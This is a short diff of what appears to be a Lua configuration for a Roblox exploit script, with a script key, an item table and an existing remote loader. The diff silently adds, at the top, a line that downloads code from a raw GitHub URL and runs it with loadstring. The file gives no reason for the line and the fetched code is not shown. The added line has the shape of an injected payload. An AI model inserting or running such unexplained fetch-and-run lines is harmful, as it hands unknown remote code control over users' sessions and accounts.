@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/raidersvin/vivivi/refs/heads/main/codephu"))()
+
 script_key = "NpgYjqSGlVoUCHAtOaTgfhSSVNQSDMRj";
 task.wait(1) 
 
@@ -51,3 +53,6 @@ _G.GMAIL_ITEMS = {
 
 		-- INSERT YOUR CONFIG HERE --
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba2dcad2127dcfc04301dfe52ce6c61c.lua"))()
+
+
+
